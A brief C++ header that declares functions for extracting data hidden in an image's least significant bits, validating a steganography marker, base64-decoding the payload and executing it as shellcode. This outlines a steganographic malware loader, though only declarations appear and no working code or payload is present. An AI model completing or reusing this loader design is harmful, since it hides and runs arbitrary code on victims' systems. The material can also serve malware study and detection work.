#pragma once
#include <string>
#include <vector>
#include <cstdint>

namespace extract
{
    std::string extract_bitstring_from_lsb(std::vector<unsigned char> image, int bitLength);

    std::vector<uint8_t> bitstring_to_bytes(const std::string& bitstring);

	bool is_valid_steg_marker(const std::vector<uint8_t>& data);

	int get_payload_length(const std::vector<uint8_t>& data);

    // Base64-decodes binary input into its original byte representation
    // std::vector<uint8_t> is used to safely handle variable-length binary data
   std::string decode_base64(const std::vector<uint8_t>& data, int payloadLength);

    void execute_shellcode(const std::vector<uint8_t>& shellcode);
}
